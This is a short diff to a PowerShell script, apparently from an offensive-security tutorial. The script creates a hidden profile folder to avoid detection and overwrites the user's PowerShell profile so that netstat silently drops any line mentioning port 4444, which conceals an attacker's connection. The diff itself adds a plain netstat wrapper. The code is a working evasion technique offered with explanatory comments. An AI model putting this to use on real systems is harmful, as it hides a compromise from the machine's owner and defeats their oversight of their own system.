@@ -3,6 +3,9 @@
 # Create PowerShell profile directory as a hidden folder to prevent detection
 cd $env:USERPROFILE;$d="Documents\WindowsPowerShell\";New-Item -ItemType Directory -Name "$d";$h=Get-Item "$d";$h.Attributes="Hidden"
 
+# Create Netstat function
+function netstat { netstat.exe $args }
+
 # Overwrite the PowerShell profile to omit any line containing a connection to a specific port. In the below example, we omit any line containing port 4444.The Select-String filter is appended transparently to the user's Netstat command and omits lines containing "4444."
 echo 'function netstat { netstat.exe $args | Select-String -notmatch "4444" }' > $PROFILE
 
